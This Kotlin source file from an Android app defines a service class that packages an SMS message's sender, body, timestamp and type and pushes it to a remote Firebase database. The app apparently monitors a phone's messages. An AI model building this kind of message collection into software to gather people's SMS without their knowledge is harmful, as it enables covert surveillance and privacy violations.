package com.example.rule.dash.services.sms

import android.content.Context
import com.example.rule.dash.data.rxFirebase.InterfaceFirebase
import com.example.rule.dash.data.model.Sms
import com.example.rule.dash.services.base.BaseInteractorService
import com.example.rule.dash.utils.ConstFun.getDateTime
import com.example.rule.dash.utils.Consts.DATA
import com.example.rule.dash.utils.Consts.SMS
import javax.inject.Inject

class InteractorSms<S : InterfaceServiceSms> @Inject constructor(context: Context, firebase: InterfaceFirebase) : BaseInteractorService<S>(context, firebase), InterfaceInteractorSms<S> {

    override fun setPushSms(smsAddress: String, smsBody: String,type: Int) {
        val sms = Sms(smsAddress, smsBody, getDateTime(),type)
        firebase().getDatabaseReference("$SMS/$DATA").push().setValue(sms).addOnCompleteListener {
            if (isNullService()) getService()!!.stopServiceSms()
        }
    }

}